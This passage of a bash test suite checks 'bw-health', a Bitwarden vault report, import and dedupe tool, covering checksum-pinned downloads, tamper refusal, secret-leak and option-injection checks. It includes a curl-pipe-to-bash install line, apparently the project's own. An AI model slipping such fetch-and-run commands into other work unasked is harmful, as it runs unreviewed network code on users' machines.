/usr/bin/jq '. + [{"id":"95","type":1,"name":"Bad URL","deletedDate":null,"login":{"username":"bad@x.com","password":"Zq4!rT8#wN2$vB6","uris":[{"uri":"http://[fe80::1"}]}}]' "$FX/items.json" >"$WORK/items-badurl.json"
uv run --quiet bw_report.py --input "$WORK/items-badurl.json" --no-hibp --no-twofa --out "$WORK/report-badurl.html" >/dev/null
flat "$WORK/report-badurl.html"
expect "$WORK/report-badurl.txt" '^Logins with a password: 6 ·' "the report survives a malformed URL"
expect "$WORK/report-badurl.txt" '^Tidy 1 AutoFill fixes 0 can be fixed for you$' "the AutoFill fix leaves a malformed address alone"
printf 'name,url,username,password,note\nBad URL,http://[fe80::1,bad@x.com,Zq4!rT8#wN2$vB6,\n' >"$WORK/badurl.csv"
uv run --quiet bw_import_diff.py "$WORK/badurl.csv" --vault "$FX/items.json" --out-dir "$WORK/import-badurl" >/dev/null
expect "$WORK/import-badurl/conflicts.md" 'New, written to .*: \*\*1\*\*' "the diff survives a malformed URL and imports the entry"
[ "$(stat -f %Lp "$WORK/import/new-for-bitwarden.csv")" = "600" ] || { echo "FAIL csv is not owner-only"; exit 1; }
pass "csv is owner-read-only"
! grep -q 'DifferentPw1' "$WORK/import/conflicts.md" || { echo "FAIL conflict password leaked"; exit 1; }
pass "conflicts never print a password"

# --- installer: fresh home, no Homebrew, files served from this checkout -------------------
FAKE_HOME="$WORK/home"
mkdir -p "$FAKE_HOME/Desktop" "$FAKE_HOME/Downloads"
HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$ROOT" /bin/bash bw-health.sh check >"$WORK/install.log" 2>&1 \
  || { cat "$WORK/install.log"; echo "FAIL installer check"; exit 1; }
expect "$WORK/install.log" 'Installed OK' "installer completes"
expect "$WORK/install.log" '^[0-9]{4}\.[0-9]+\.[0-9]+$' "installer prints the bw version"
expect "$WORK/install.log" '^uv [0-9]' "installer prints the uv version"
[ -x "$FAKE_HOME/Library/Application Support/bw-health/bin/bw" ] || { echo "FAIL bw not installed"; exit 1; }
APP="$FAKE_HOME/Library/Application Support/bw-health"
VERSION="$(sed -n 's/^VERSION="\(.*\)"$/\1/p' bw-health.sh)"; FILES="$(sed -n 's/^FILES="\(.*\)"$/\1/p' bw-health.sh)"
[[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] && [ -n "$FILES" ] || { echo "FAIL bw-health.sh must name its VERSION (X.Y.Z) and its FILES"; exit 1; }
for f in $FILES; do [ ! -e "$APP/$f" ] || { echo "FAIL $f was left in the app folder, where another run could mix versions"; exit 1; }; done
! compgen -G "$APP/run.*" >/dev/null || { ls "$APP"; echo "FAIL a run left its scripts folder behind"; exit 1; }
pass "installer put bw in the app folder; the fetched files lived in this run's own folder, removed at the end"
[ "$(sed -n 2p "$WORK/install.log")" = "==> bw-health v$VERSION. The line that always runs exactly this version:" ] || { head -4 "$WORK/install.log"; echo "FAIL a fetched run must open with its version, before anything is installed"; exit 1; }
pass "a fetched run opens with its version"
expect "$WORK/install.log" "^    curl -fsSL https://raw.githubusercontent.com/nellirob92/bw-health/v$VERSION/bw-health.sh \| bash$" "and shows the paste line pinned to that version's tag"
HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$ROOT" /bin/bash bw-health.sh check >"$WORK/install2.log" 2>&1
! grep -q 'Installing' "$WORK/install2.log" || { echo "FAIL second run re-installed"; exit 1; }
pass "second run skips installs"

# A copy of the installer with every pinned hash zeroed must refuse the download and install nothing.
# Cannot catch a pin that is correct for one architecture and wrong for the other (CI runs one).
BAD_HOME="$WORK/bad-home"
mkdir -p "$BAD_HOME/.local/bin" "$BAD_HOME/Desktop"
ln -s "$FAKE_HOME/.local/bin/uv" "$BAD_HOME/.local/bin/uv"
sed -E 's/"[0-9a-f]{64}"/"0000000000000000000000000000000000000000000000000000000000000000"/' bw-health.sh >"$WORK/bw-health-bad-pin.sh"
! cmp -s bw-health.sh "$WORK/bw-health-bad-pin.sh" || { echo "FAIL test setup: no pinned hash was replaced"; exit 1; }
if HOME="$BAD_HOME" BW_HEALTH_BASE_URL="file://$ROOT" /bin/bash "$WORK/bw-health-bad-pin.sh" check >"$WORK/bad-pin.log" 2>&1; then
  cat "$WORK/bad-pin.log"; echo "FAIL installer accepted a download that does not match its pinned checksum"; exit 1
fi
expect "$WORK/bad-pin.log" 'did not match its checksum' "installer refuses a download that fails its checksum"
[ ! -e "$BAD_HOME/Library/Application Support/bw-health/bin/bw" ] || { echo "FAIL bw installed despite a bad checksum"; exit 1; }
pass "nothing is installed when the checksum fails"

# --- releases: every fetched file is pinned by checksum, and a tagged version is frozen ---------------
for f in $FILES; do
  sum="$(shasum -a 256 "$f" | cut -d' ' -f1)"
  grep -qE "^ +$f\) +echo \"$sum\" ;;$" bw-health.sh || { echo "FAIL the checksum of $f written in bw-health.sh is stale. Its line must read:"; echo "    $f) echo \"$sum\" ;;"; exit 1; }
done
pass "every fetched file matches the checksum written in bw-health.sh"
# Asks origin, so a clone without tags (CI) is judged the same way. Cannot catch a tag that was moved.
tagged=0; git ls-remote --exit-code --tags origin "refs/tags/v$VERSION" >/dev/null 2>&1 || tagged=$?
case "$tagged" in
  0)
    git fetch -q origin "refs/tags/v$VERSION:refs/tags/v$VERSION"
    # shellcheck disable=SC2086
    git diff --quiet "v$VERSION" -- bw-health.sh $FILES || { echo "FAIL bw-health.sh or a file it fetches changed after v$VERSION was tagged. Raise VERSION: a released version never changes."; exit 1; }
    pass "nothing the paste line runs has changed since v$VERSION was tagged" ;;
  2) pass "v$VERSION is not tagged yet, so it may still change" ;;
  *) echo "FAIL could not ask origin whether v$VERSION is tagged"; exit 1 ;;
esac
# A served file that differs by one line is refused, never installed, and nothing is left half-written.
for f in bw_dedupe.py fix_order.txt public_suffix_list.dat; do
  rm -rf "$WORK/served"; mkdir "$WORK/served"
  # shellcheck disable=SC2086
  cp $FILES "$WORK/served/"; echo '# one line more' >>"$WORK/served/$f"
  if HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$WORK/served" /bin/bash bw-health.sh check >"$WORK/tamper.log" 2>&1; then
    cat "$WORK/tamper.log"; echo "FAIL a changed $f was accepted"; exit 1
  fi
  expect "$WORK/tamper.log" "$f did not match the checksum written in bw-health.sh, so it was not used" "a fetched $f that fails its checksum is refused by name"
  [ ! -e "$APP/$f" ] && ! compgen -G "$APP/run.*" >/dev/null || { ls "$APP"; echo "FAIL a $f that failed its checksum was installed or left behind"; exit 1; }
done
! grep -q 'bw-health/main' bw-health.sh README.md || { grep -n 'bw-health/main' bw-health.sh README.md; echo "FAIL the tool or its README still points at main"; exit 1; }
pass "a file that fails its checksum is not used, and nothing points at main"

# --- installer: staging exports from Downloads (run under the Mac's own bash 3.2) ----------
DL="$FAKE_HOME/Downloads"; IMP="$FAKE_HOME/Library/Application Support/bw-health/Bitwarden Import"; TODAY="$(date +%Y-%m-%d)"
cp "$FX/chrome.csv" "$DL/Google Passwords.csv"
cp "$FX/chrome.csv" "$DL/Google Passwords (1).csv"; touch -t "$(date -v-2d +%Y%m%d%H%M)" "$DL/Google Passwords (1).csv"
cp "$FX/apple.csv" "$DL/Passwords.csv"; touch -t "$(date -v-10d +%Y%m%d%H%M)" "$DL/Passwords.csv"
printf 'url,title\nhttps://x.com,not a password file\n' >"$DL/other.csv"
printf 'skip\n' >"$WORK/tty"
stage() { HOME="$FAKE_HOME" BW_HEALTH_BASE_URL="file://$ROOT" BW_HEALTH_TTY="$1" /bin/bash bw-health.sh exports; }

D2="$(date -v-2d +%Y-%m-%d)"; D10="$(date -v-10d +%Y-%m-%d)"
stage "$WORK/tty" >"$WORK/stage1.log" 2>&1 || { cat "$WORK/stage1.log"; echo "FAIL stage 1"; exit 1; }
expect "$WORK/stage1.log" "Moved Google Passwords.csv to Bitwarden Import/chrome-passwords-$TODAY.csv" "newest fresh Chrome export is moved and renamed"
expect "$WORK/stage1.log" "Moved Google Passwords \(1\).csv to Bitwarden Import/chrome-passwords-$D2.csv" "older Chrome copy is moved too"
expect "$WORK/stage1.log" "Moved Passwords.csv to Bitwarden Import/apple-passwords-$D10.csv" "stale Apple export is moved too"
[ "$(tail -2 "$WORK/stage1.log" | tr '\n' ' ')" = "$IMP/chrome-passwords-$TODAY.csv $IMP/chrome-passwords-$D2.csv " ] || { tail -3 "$WORK/stage1.log"; echo "FAIL every fresh export feeds the diff, newest first"; exit 1; }
for f in "chrome-passwords-$TODAY" "chrome-passwords-$D2" "apple-passwords-$D10"; do
  [ -f "$IMP/$f.csv" ] || { echo "FAIL $f.csv missing from the import folder"; exit 1; }
  [ "$(stat -f %Lp "$IMP/$f.csv")" = "600" ] || { echo "FAIL $f.csv not owner-only"; exit 1; }
done
[ "$(ls "$DL")" = "other.csv" ] || { ls "$DL"; echo "FAIL every password export must leave Downloads; unrelated csv stays"; exit 1; }
! grep -q 'Press Return' "$WORK/stage1.log" || { echo "FAIL no prompt expected when a fresh export exists"; exit 1; }
[ -z "$(ls "$FAKE_HOME/Desktop" 2>/dev/null | grep -v 'Bitwarden Report')" ] || { echo "FAIL plain-text files must never land on the Desktop (iCloud sync)"; exit 1; }
pass "every export leaves Downloads; every fresh one feeds the diff newest first; nothing on the Desktop"

cp "$FX/apple.csv" "$DL/Passwords.csv"; touch -t "$(date -v-10d +%Y%m%d%H%M)" "$DL/Passwords.csv"
stage "$WORK/tty" >"$WORK/stage2.log" 2>&1 || { cat "$WORK/stage2.log"; echo "FAIL stage 2"; exit 1; }
expect "$WORK/stage2.log" 'Passwords.csv \(apple, from .*\) is older than 7 days' "stale export is named with its date"
expect "$WORK/stage2.log" 'Skipping the import step' "typing skip ends the import step"
[ -f "$IMP/apple-passwords-$D10-2.csv" ] || { ls "$IMP"; echo "FAIL stale file must still be moved, with a -2 suffix on a name clash"; exit 1; }
[ ! -e "$DL/Passwords.csv" ] || { echo "FAIL stale file left in Downloads"; exit 1; }
pass "stale-only Downloads prompts for a re-export, honours skip, and still moves the stale file"

mkfifo "$WORK/fifo"
( sleep 1; cp "$FX/apple.csv" "$DL/Passwords.csv"; printf '\n' >"$WORK/fifo" ) &
stage "$WORK/fifo" >"$WORK/stage3.log" 2>&1 || { cat "$WORK/stage3.log"; echo "FAIL stage 3"; exit 1; }
wait
expect "$WORK/stage3.log" "Moved Passwords.csv to Bitwarden Import/apple-passwords-$TODAY.csv" "after Return, the fresh re-export is picked up"
[ "$(tail -1 "$WORK/stage3.log")" = "$IMP/apple-passwords-$TODAY.csv" ] || { echo "FAIL re-export not staged for the diff"; exit 1; }
pass "re-export after the prompt is staged"

stage "$WORK/tty" >"$WORK/stage4.log" 2>&1 || { cat "$WORK/stage4.log"; echo "FAIL stage 4"; exit 1; }
expect "$WORK/stage4.log" 'No password export from the last 7 days' "empty Downloads prompts"
expect "$WORK/stage4.log" 'Skipping the import step' "empty Downloads plus skip exits cleanly"
pass "nothing to stage is handled"

# --- dedupe: exact and merge stages, through a stand-in bw that keeps state ------------------------
# The stand-in applies edit (JSON on stdin) and delete (soft: sets deletedDate) to a state file,
# rejects every other call (--permanent included) and logs argv. It cannot catch the real bw behaving
# differently from this model; the first real run, limited to one group, is that check.
mkdir "$WORK/fakebin-state"
cat >"$WORK/fakebin-state/bw" <<'EOF'
#!/bin/bash
echo "$*" >>"$FAKE_BW_LOG"
case "$#:$1:$2" in
  1:status:) echo '{"status":"unlocked"}' ;;
  1:sync:) echo 'Syncing complete.' ;;
  2:list:items) cat "$FAKE_BW_STATE" ;;
  2:list:folders) cat "$FAKE_BW_FOLDERS" ;;
  3:get:item) /usr/bin/jq --arg id "$3" '.[] | select(.id == $id)' "$FAKE_BW_STATE" ;;
  3:edit:item)
    new="$(base64 --decode)"
    case "${FAKE_BW_EDIT_BUG:-}" in
      drop-passkey) new="$(/usr/bin/jq 'del(.login.fido2Credentials)' <<<"$new")" ;;
      blank-password) new="$(/usr/bin/jq '.login.password = ""' <<<"$new")" ;;
      rewrite-rpid) new="$(/usr/bin/jq '.login.fido2Credentials[0].rpId = "other.example.com"' <<<"$new")" ;;
      drop-fields) new="$(/usr/bin/jq '.fields = []' <<<"$new")" ;;
      rename) new="$(/usr/bin/jq '.name = "Renamed by bw"' <<<"$new")" ;;
      unfavorite) new="$(/usr/bin/jq '.favorite = false' <<<"$new")" ;;
      drop-https) new="$(/usr/bin/jq '.login.uris |= map(select(.uri | startswith("https://") | not))' <<<"$new")" ;;
    esac
    /usr/bin/jq --arg id "$3" --argjson new "$new" 'map(if .id == $id then $new else . end)' "$FAKE_BW_STATE" >"$FAKE_BW_STATE.tmp" \
      && mv "$FAKE_BW_STATE.tmp" "$FAKE_BW_STATE" && echo '{}' ;;
  3:delete:item)
    /usr/bin/jq --arg id "$3" 'map(if .id == $id then .deletedDate = "2026-10-26T00:00:00Z" else . end)' "$FAKE_BW_STATE" >"$FAKE_BW_STATE.tmp" \
      && mv "$FAKE_BW_STATE.tmp" "$FAKE_BW_STATE" ;;
  *) echo "Invalid command: $*" >&2; exit 1 ;;
esac
EOF
chmod +x "$WORK/fakebin-state/bw"
STATE="$WORK/vault-state.json"; BWLOG="$WORK/bw-calls.log"; PLANS="$WORK/dedupe-plan"
cp "$FX/dupes.json" "$STATE"; : >"$BWLOG"
printf 'no\n' >"$WORK/tty-no"; printf 'DEDUPE\n' >"$WORK/tty-yes"
dedupe() { # dedupe <tty file> <args...>
  local tty="$1"; shift
  PATH="$WORK/fakebin-state:$PATH" BW_SESSION=fake FAKE_BW_STATE="$STATE" FAKE_BW_FOLDERS="$FX/folders.json" FAKE_BW_LOG="$BWLOG" BW_HEALTH_TTY="$tty" \
    uv run --quiet bw_dedupe.py "$@" --out-dir "$PLANS"
}
live() { /usr/bin/jq --arg re "$1" '[.[] | select(.deletedDate == null) | select(.id | test($re))] | length' "$STATE"; }
vault() { /usr/bin/jq -r --arg id "$1" ".[] | select(.id == \$id) | $2" "$STATE"; }

cp "$STATE" "$WORK/state-before.json"
dedupe "$WORK/tty-no" exact >"$WORK/dd1.log" 2>&1 || { cat "$WORK/dd1.log"; echo "FAIL exact dry run"; exit 1; }
dedupe "$WORK/tty-no" merge >"$WORK/dd2.log" 2>&1 || { cat "$WORK/dd2.log"; echo "FAIL merge dry run"; exit 1; }
expect "$WORK/dd1.log" '^2 group\(s\) to change, 9 left alone, 8 for another stage' "exact stage counts its groups, the blocked ones and the merge ones"
expect "$WORK/dd2.log" '^10 group\(s\) to change, 9 left alone, 0 for another stage' "merge stage counts its groups, the identical ones included"
expect "$WORK/dd1.log" 'Nothing was changed' "a dry run says it changed nothing"
[ "$(grep -n 'PREVIEW ONLY' "$WORK/dd1.log" | head -1 | cut -d: -f1)" = "1" ] || { head -3 "$WORK/dd1.log"; echo "FAIL the preview-only notice must be the first line a dry run prints"; exit 1; }
expect "$WORK/dd1.log" 'PREVIEW ONLY: this step does not change, merge or delete anything' "a dry run opens by saying it is only a preview"
cmp -s "$STATE" "$WORK/state-before.json" || { echo "FAIL a dry run changed the vault"; exit 1; }
! grep -qE '^(edit|delete) ' "$BWLOG" || { cat "$BWLOG"; echo "FAIL a dry run called edit or delete"; exit 1; }
pass "dry runs change nothing"
for why in 'has an attachment' 'several copies hold a passkey' 'a passkey that bw listed without its key' 'a copy has password history the kept copy lacks' 'different passwords' 'different one-time-code seeds' 'shared with an organization' 'a custom field with different values' 'the same URL with different match settings'; do
  expect "$PLANS/plan-exact.md" "$why" "plan says why a group is left alone: $why"
done
expect "$PLANS/plan-exact.md" '^\| hulu.com \(exact@x.com\) \| 2 \|' "plan names the account to change"
expect "$PLANS/plan-exact.md" 'Hu/lu' "a pipe in a name cannot break the plan table"
! grep -q "$(printf '\033')" "$PLANS/plan-exact.md" || { echo "FAIL a terminal escape reached the plan file"; exit 1; }
expect "$PLANS/plan-merge.md" 'folders differ' "plan says when the kept folder wins"
! grep -q 'PW-secret\|secret note' "$PLANS/plan-exact.md" "$PLANS/plan-merge.md" || { echo "FAIL a password or note reached a plan file"; exit 1; }
pass "plans never carry a password or a note"

# What apply is about to do is printed, group by group, before the confirmation is asked for.
expect "$WORK/dd2.log" 'Preview: the first 3 of 10 groups' "a dry run previews a few groups and says the plan holds the rest"
expect "$WORK/dd2.log" '^\[1/10\] etsy.com \(m@x.com\)' "a dry run shows those groups in full, numbered out of the total"
expect "$WORK/dd2.log" 'TRASH +"Etsy" +folder: no folder' "a dry run shows the copy it would trash"
expect "$WORK/dd2.log" 'Left alone: .*different passwords' "a dry run says why groups are left alone"
expect "$PLANS/plan-merge.md" '^\| example.com \(f@x.com\) \| 2 \|.*Chrome.*Apple' "the plan names the kept and the trashed folder"
if dedupe "$WORK/tty-no" merge --apply --limit 4 >"$WORK/dd-preview.log" 2>&1; then echo "FAIL preview run was confirmed"; exit 1; fi
expect "$WORK/dd-preview.log" 'Acting on 4 of 10 groups' "apply says how many groups it will act on"
expect "$WORK/dd-preview.log" 'Nothing in your vault changes until you have read the list below and typed DEDUPE' "apply opens by saying nothing changes before the typed word"
! grep -q 'PREVIEW ONLY' "$WORK/dd-preview.log" || { echo "FAIL an apply run must not claim to be preview-only"; exit 1; }
expect "$WORK/dd-preview.log" '^\[1/4\] etsy.com \(m@x.com\)' "apply numbers each group with its account"
expect "$WORK/dd-preview.log" 'KEEP +"Etsy shop" +folder: no folder +2 URLs' "apply shows the copy it keeps, with folder and URL count"
expect "$WORK/dd-preview.log" 'TRASH +"Etsy" +folder: no folder +2 URLs' "apply shows the copy it trashes"
expect "$WORK/dd-preview.log" 'ADDS +\+1 URL \(https://m.etsy.com/\), notes joined, marked favorite, master password re-prompt turned on$' "apply shows exactly what the kept copy gains, flags included"
! grep -q 'TOKEN123' "$WORK/dd-preview.log" "$WORK/dd2.log" "$PLANS/plan-merge.md" || { echo "FAIL a URL query string reached the terminal or the plan"; exit 1; }
pass "a URL's query string (it can carry a token) is not shown"
expect "$WORK/dd-preview.log" 'KEEP +"Folders" +folder: Chrome' "apply shows the kept folder by name"
expect "$WORK/dd-preview.log" 'TRASH +"Folders" +folder: Apple' "apply shows the trashed copy's folder by name"
expect "$WORK/dd-preview.log" 'This will edit 1 kept copy and move 4 copies to the Bitwarden trash' "the prompt states the edits and the trashing"
expect "$WORK/dd-preview.log" 'Not confirmed' "the previewed run still stops without the word"
[ "$(sed -n '/^\[2\/4\] example.com (b3@x.com)/,/^$/p' "$WORK/dd-preview.log" | grep -c 'holds a passkey')" = "0" ] || { echo "FAIL a passkey group with nothing to edit warned that its edit is read back"; exit 1; }
! grep -q 'PW-secret\|secret note' "$WORK/dd-preview.log" "$WORK/dd2.log" || { echo "FAIL a password or note reached the terminal output"; exit 1; }
pass "the terminal output never carries a password or a note"

if dedupe "$WORK/tty-no" merge --apply --limit 8 >"$WORK/dd-preview2.log" 2>&1; then echo "FAIL preview run was confirmed"; exit 1; fi
expect "$WORK/dd-preview2.log" 'KEEP +"Passkey only"' "a passkey copy is the one shown as kept"
expect "$WORK/dd-preview2.log" 'TRASH +"Password only"' "the password-only copy is the one shown as trashed"
expect "$WORK/dd-preview2.log" 'ADDS +password taken from another copy' "the preview says the kept copy takes the other copy's password"
expect "$WORK/dd-preview2.log" 'could already be changed: keep the original in Apple Passwords or Chrome' "a passkey group warns that the edit cannot be undone by the read-back"
! grep -q 'KEYDATA\|PW-secret' "$WORK/dd-preview2.log" || { echo "FAIL a passkey key or password reached the preview"; exit 1; }
pass "a passkey group is previewed with its warning, and no key or password is shown"

if dedupe "$WORK/tty-no" exact --apply >"$WORK/dd3.log" 2>&1; then cat "$WORK/dd3.log"; echo "FAIL apply went ahead without the confirmation word"; exit 1; fi
expect "$WORK/dd3.log" 'Not confirmed' "apply stops unless the word is typed"
cmp -s "$STATE" "$WORK/state-before.json" || { echo "FAIL an unconfirmed apply changed the vault"; exit 1; }
if dedupe "$WORK/tty-yes" merge --apply --limit 0 >"$WORK/dd4.log" 2>&1; then echo "FAIL --limit 0 accepted"; exit 1; fi
pass "no change without the confirmation word; --limit 0 refused"

LEFT_BEFORE="$(live '^(m|c|f|l|g|h|b[124-8]|p|u|n)')"
dedupe "$WORK/tty-yes" exact --apply >"$WORK/dd5.log" 2>&1 || { cat "$WORK/dd5.log"; echo "FAIL exact apply"; exit 1; }
expect "$WORK/dd5.log" 'Hulu|hulu.com \(exact@x.com\): kept one, trashed 1' "exact apply reports its group"
[ "$(live '^e1')" = "1" ] && [ "$(vault e1a .deletedDate)" != "null" ] && [ "$(vault e1b .deletedDate)" = "null" ] || { echo "FAIL exact stage did not keep the newest and trash the other"; exit 1; }
[ "$(live '^b3')" = "1" ] && [ "$(vault b3a .deletedDate)" = "null" ] && [ "$(vault b3b .deletedDate)" != "null" ] || { echo "FAIL the exact stage must keep the copy that holds the passkey, even when it is the older one"; exit 1; }
[ "$(live '^(m|c|f|l|g|h|b[124-8]|p|u|n)')" = "$LEFT_BEFORE" ] || { echo "FAIL the exact stage touched a merge or blocked group"; exit 1; }
! grep -qE '^edit ' "$BWLOG" || { echo "FAIL the exact stage edited an item"; exit 1; }
pass "exact stage trashes only the identical copy, keeps the passkey holder, and touches nothing else"

dedupe "$WORK/tty-yes" merge --apply --limit 1 >"$WORK/dd6.log" 2>&1 || { cat "$WORK/dd6.log"; echo "FAIL merge apply limit 1"; exit 1; }
[ "$(live '^m1')" = "1" ] && [ "$(live '^(c1|m2)')" = "4" ] || { echo "FAIL --limit 1 did not stop after the first group"; exit 1; }
pass "--limit 1 acts on one group only"

dedupe "$WORK/tty-yes" merge --apply >"$WORK/dd7.log" 2>&1 || { cat "$WORK/dd7.log"; echo "FAIL merge apply"; exit 1; }
[ "$(vault m1b '.login.uris | length')" = "3" ] || { echo "FAIL merge did not add the other copy's URL once"; exit 1; }
[ "$(vault m1b '.notes | contains("other note") and contains("keep note")')" = "true" ] || { echo "FAIL merge dropped a note"; exit 1; }
[ "$(vault m1b '.fields | length')" = "1" ] && [ "$(vault m1b .login.totp)" = "otpauth://totp/etsy?secret=AAAA" ] || { echo "FAIL merge lost a field or the one-time-code seed"; exit 1; }
[ "$(vault m1b .favorite)" = "true" ] && [ "$(vault m1b .login.password)" = "PW-secret-merge" ] || { echo "FAIL merge lost the favorite flag or changed the password"; exit 1; }
[ "$(vault m1a .deletedDate)" != "null" ] && [ "$(vault m2a .deletedDate)" != "null" ] && [ "$(vault m2b .deletedDate)" = "null" ] || { echo "FAIL merge did not trash the other copies"; exit 1; }
[ "$(vault g1b '.login.uris | length')" = "3" ] && [ "$(vault g1b '.login.uris[2].uri')" = "zy-scheme.example.com:8443" ] && [ "$(vault g1a .deletedDate)" != "null" ] && [ "$(live '^g1')" = "1" ] || { echo "FAIL URLs on the same site with default matching (any scheme, www., path, query string) must count as one, but the same host on another port is a different URL"; exit 1; }
[ "$(vault h1b '.login.uris | length')" = "5" ] && [ "$(vault h1a .deletedDate)" != "null" ] || { echo "FAIL URLs with an exact-match setting must be compared by scheme, path and query string, ignoring only a trailing slash"; exit 1; }
[ "$(grep -c '^edit item' "$BWLOG")" = "5" ] && ! grep -qE '^edit item (e1|c1|f1|m2|b[1-8]|p[23])' "$BWLOG" || { grep '^edit' "$BWLOG"; echo "FAIL only the Etsy, Linked, Passkey-only, Scheme (port) and Exact-match keepers needed an edit"; exit 1; }
[ "$(grep -c '^get item' "$BWLOG")" = "5" ] || { grep -c '^get item' "$BWLOG"; echo "FAIL every edit must be read back from the vault"; exit 1; }
[ "$(live '^b7')" = "2" ] || { echo "FAIL a copy holding password history the kept copy lacks was trashed (bw edit cannot save a joined history)"; exit 1; }
[ "$(vault p1a .login.password)" = "PW-secret-p1" ] && [ "$(vault p1a '.login.fido2Credentials[0].credentialId')" = "cred-p1" ] && [ "$(vault p1a '.login.fido2Credentials[0].keyValue')" = "KEYDATA-p1" ] || { echo "FAIL the passkey copy did not take the password, or its passkey changed"; exit 1; }
[ "$(vault p1b .deletedDate)" != "null" ] && [ "$(vault p1a .deletedDate)" = "null" ] || { echo "FAIL the password-only copy was not trashed and the passkey copy kept"; exit 1; }
[ "$(vault l1a .deletedDate)" != "null" ] && [ "$(vault l1b '.fields | length')" = "2" ] || { echo "FAIL linked fields that differ only by linkedId were treated as identical or one was lost"; exit 1; }
[ "$(vault m1b .reprompt)" = "1" ] || { echo "FAIL merge did not keep the stricter reprompt setting"; exit 1; }
[ "$(vault f1a .deletedDate)" != "null" ] && [ "$(vault f1b .deletedDate)" = "null" ] && [ "$(vault f1b .folderId)" = "fB" ] || { echo "FAIL a copy that differs only by folder was not merged into the kept folder"; exit 1; }
pass "merge adds URLs, notes, fields and the seed to the keeper, then trashes the copy"

[ "$(live '^(b1|b2|b4|b5|b6|b7|b8|p2|p3)')" = "18" ] && [ "$(live '^(u1|u3|n1)$')" = "3" ] || { echo "FAIL a left-alone group or an unrelated item changed"; exit 1; }
! grep -q 'PW-secret' "$BWLOG" || { echo "FAIL a password reached bw's command line"; exit 1; }
! grep -q -- '--permanent' "$BWLOG" || { echo "FAIL a delete was permanent"; exit 1; }
dedupe "$WORK/tty-no" merge >"$WORK/dd8.log" 2>&1 && dedupe "$WORK/tty-no" exact >"$WORK/dd9.log" 2>&1 || { echo "FAIL final dry runs"; exit 1; }
expect "$WORK/dd8.log" '^0 group\(s\) to change, 9 left alone, 0 for another stage' "a second merge run finds nothing left to do"
expect "$WORK/dd9.log" '^0 group\(s\) to change, 9 left alone, 0 for another stage' "a second exact run finds nothing left to do"
pass "left-alone groups stay; no password on a command line; deletes go to the trash"

# After each edit the item is read back. If bw saved something other than what was meant (a dropped
# passkey, a blanked password) the run stops before that group's other copies are trashed.
for spec in "drop-passkey:p1:passkey" "rewrite-rpid:p1:passkey" "blank-password:p1:password" "drop-fields:l1:custom fields" "rename:m1:name" "unfavorite:m1:favorite"; do
  bug="${spec%%:*}"; rest="${spec#*:}"; group="${rest%%:*}"; what="${rest#*:}"
  /usr/bin/jq --arg g "^$group" '[.[] | select(.id | test($g))]' "$FX/dupes.json" >"$WORK/state-$bug.json"
  DELETES_BEFORE="$(grep -c '^delete' "$BWLOG")"
  if ( STATE="$WORK/state-$bug.json"; FAKE_BW_EDIT_BUG="$bug" dedupe "$WORK/tty-yes" merge --apply >"$WORK/dd-$bug.log" 2>&1 ); then
    cat "$WORK/dd-$bug.log"; echo "FAIL the run went on after bw saved a bad edit ($bug)"; exit 1
  fi
  [ "$(grep -c '^delete' "$BWLOG")" = "$DELETES_BEFORE" ] || { echo "FAIL a copy was trashed after a bad edit ($bug)"; exit 1; }
  expect "$WORK/dd-$bug.log" "bw saved a different .*$what" "a bad edit ($bug) is caught after the edit"
  ! grep -q 'PW-secret\|KEYDATA' "$WORK/dd-$bug.log" || { echo "FAIL a secret reached the verification message ($bug)"; exit 1; }
done
expect "$WORK/dd-drop-passkey.log" 'may already be changed' "the stop says the passkey itself may already be changed, not only that nothing was trashed"
pass "a bad edit stops the run before anything is trashed, and the message holds no secret"

# An id that starts with "-" could be read by bw as an option, so apply refuses before any call.
/usr/bin/jq '[.[] | select(.id | test("^e1"))] | map(.id |= "-" + .)' "$FX/dupes.json" >"$WORK/state-dash.json"
DELETES_BEFORE="$(grep -c '^delete' "$BWLOG")"
if ( STATE="$WORK/state-dash.json"; dedupe "$WORK/tty-yes" exact --apply >"$WORK/dd10.log" 2>&1 ); then cat "$WORK/dd10.log"; echo "FAIL an id starting with a dash was acted on"; exit 1; fi
expect "$WORK/dd10.log" "id starts with '-'" "apply refuses an id that bw could read as an option"
[ "$(grep -c '^delete' "$BWLOG")" = "$DELETES_BEFORE" ] || { echo "FAIL a delete ran before the dash id was refused"; exit 1; }
pass "an option-like item id is refused before any bw call"

# If bw never reports organizationId, shared items cannot be told apart, so nothing may run.
/usr/bin/jq 'map(del(.organizationId))' "$FX/dupes.json" >"$WORK/state-noorg.json"
if ( STATE="$WORK/state-noorg.json"; dedupe "$WORK/tty-no" exact >"$WORK/dd11.log" 2>&1 ); then cat "$WORK/dd11.log"; echo "FAIL ran without any organizationId in the vault"; exit 1; fi
expect "$WORK/dd11.log" 'belong to an organization' "a vault that never reports organizations is refused"
pass "no organization information means no dedupe"

# --- dedupe and the AutoFill fix on tests/fixture/dashboard.json ---------------------------------------
# One bank across secureNN subdomains, a co.uk pair and a passkey pair are each one account; two github.io
# sites with the same username and password are not. Cannot catch a public suffix the pinned list lacks.
sv() { /usr/bin/jq -r --arg id "$1" ".[] | select(.id == \$id) | $2" "$WORK/state-site.json"; }
cp "$FX/dashboard.json" "$WORK/state-site.json"; : >"$WORK/bw-site.log"
site() { ( STATE="$WORK/state-site.json"; BWLOG="$WORK/bw-site.log"; dedupe "$@" ); }
site "$WORK/tty-no" merge >"$WORK/dd-site1.log" 2>&1 || { cat "$WORK/dd-site1.log"; echo "FAIL merge dry run on the dashboard vault"; exit 1; }
expect "$WORK/dd-site1.log" '^3 group\(s\) to change, 1 left alone, 0 for another stage' "merge finds the bank, the co.uk pair and the passkey pair, and leaves the field clash alone"
! grep -q 'github' "$WORK/dd-site1.log" "$PLANS/plan-merge.md" || { echo "FAIL two sites on github.io were grouped as one account"; exit 1; }
site "$WORK/tty-yes" merge --apply >"$WORK/dd-site2.log" 2>&1 || { cat "$WORK/dd-site2.log"; echo "FAIL merge apply on the dashboard vault"; exit 1; }
[ "$(sv d1f .deletedDate)" = "null" ] && [ "$(/usr/bin/jq '[.[] | select(.id | test("^d1[a-e]$")) | select(.deletedDate == null)] | length' "$WORK/state-site.json")" = "0" ] || { echo "FAIL the newest bank copy must be kept and the five others trashed"; exit 1; }
[ "$(sv d1f '.login.uris | length')" = "7" ] || { sv d1f '.login.uris'; echo "FAIL the kept bank copy must gain every other copy's address once"; exit 1; }
